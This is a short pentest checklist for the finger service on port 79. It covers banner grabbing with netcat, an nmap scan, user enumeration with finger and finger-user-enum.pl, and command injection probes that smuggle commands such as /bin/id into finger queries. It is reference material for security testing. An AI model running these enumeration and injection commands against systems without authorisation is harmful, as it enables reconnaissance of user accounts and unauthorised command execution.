## ‚úÖ Finger Pentest Checklist

- [ ] **Banner Grabbing**
  - Check for service version and responses.
    ```
    nc -vn <IP> 79
    echo "root" | nc -vn <IP> 79
    ```

- [ ] **Nmap Scan**
  - Identify service details and default scripts.
    ```
    nmap -vvv -Pn -sC -sV -p79 <IP>
    ```

- [ ] **User Enumeration**
  - Basic finger queries.
    ```
    finger @<IP>
    finger <USER>@<IP>
    finger @<Victim>
    finger admin@<Victim>
    finger user@<Victim>
    ```
  - Automated enumeration.
    ```
    finger-user-enum.pl -U users.txt -t 10.0.0.1
    finger-user-enum.pl -u root -t 10.0.0.1
    finger-user-enum.pl -U users.txt -T ips.txt
    ```

- [ ] **Check for Command Execution**
  - Attempt to inject commands if the server is misconfigured.
    ```
    finger "|/bin/id@<IP>"
    finger "|/bin/ls -a /<IP>"
    finger "|/bin/id@example.com"
    finger "|/bin/ls -a /@example.com"
    ```
